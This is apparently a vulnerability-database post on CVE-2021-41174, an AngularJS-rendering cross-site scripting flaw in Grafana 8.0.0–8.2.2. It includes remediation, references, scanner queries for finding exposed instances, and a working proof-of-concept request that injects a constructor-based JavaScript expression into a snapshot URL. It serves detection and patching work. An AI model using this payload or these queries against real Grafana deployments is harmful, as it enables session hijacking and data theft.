---
layout: post
cve_id: CVE-2021-41174
title: Grafana 8.0.0 <= v.8.2.2 - Angularjs Rendering Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41174.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41174.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to potential data theft, session hijacking, or defacement of the Grafana application.

  '
remediation: Upgrade to 8.2.3 or higher.
reference:
- https://github.com/grafana/grafana/security/advisories/GHSA-3j9m-hcv9-rpj8
- https://nvd.nist.gov/vuln/detail/CVE-2021-41174
- https://github.com/grafana/grafana/commit/3cb5214fa45eb5a571fd70d6c6edf0d729983f82
- https://github.com/grafana/grafana/commit/31b78d51c693d828720a5b285107a50e6024c912
- https://github.com/grafana/grafana/commit/fb85ed691290d211a5baa44d9a641ab137f0de88
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-41174
  cwe-id: CWE-79
  epss-score: 0.79005
  epss-percentile: 0.99015
  cpe: cpe:2.3:a:grafana:grafana:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: grafana
  product: grafana
  shodan-query:
  - title:"Grafana"
  - cpe:"cpe:2.3:a:grafana:grafana"
  - http.title:"grafana"
  fofa-query:
  - title="grafana"
  - app="grafana"
  google-query: intitle:"grafana"
tags:
- cve2021
- cve
- grafana
- xss
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Grafana is an open-source platform for monitoring and observability. In affected versions if an attacker is able to convince a victim to visit a URL referencing a vulnerable page, arbitrary JavaScript content may be executed within the context of the victim's browser. The user visiting the malicious link must be unauthenticated and the link must be for a page that contains the login button in the menu bar. The url has to be crafted to exploit AngularJS rendering and contain the interpolation binding for AngularJS expressions.

## ðŸŒ HTTP Request
```nohighlight
GET /dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

